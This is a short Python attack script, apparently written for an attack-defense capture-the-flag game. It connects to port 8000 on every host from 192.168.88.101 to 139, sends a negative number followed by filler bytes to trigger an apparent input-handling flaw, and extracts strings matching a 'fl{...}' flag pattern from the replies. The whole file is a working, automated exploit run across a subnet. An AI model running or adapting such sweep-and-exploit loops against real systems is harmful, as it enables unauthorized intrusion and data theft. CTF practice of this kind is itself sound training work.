#!/usr/bin/env python3



from socket import SHUT_RDWR, create_connection
from time import sleep
import re

p = re.compile('fl\{.*?\}')

timeouts = [101,105,106,107,108,109,117,119,121,133,136]

for i in range(101,140):
  serverAdress = f"192.168.88.{i}"
  portno = 8000

  try:
    sock = create_connection((serverAdress, portno))
    sock.settimeout(10)

    attack1 = b"-100\n"
    attack2 = b"aaaa"

    sock.sendall(attack1)
    sock.sendall(attack2)

    res = sock.recv(4096)

    print(f"{i}: {p.findall(res.decode(errors='replace'))}")
  except:
    print(f"{i}: timeout")

  sock.close()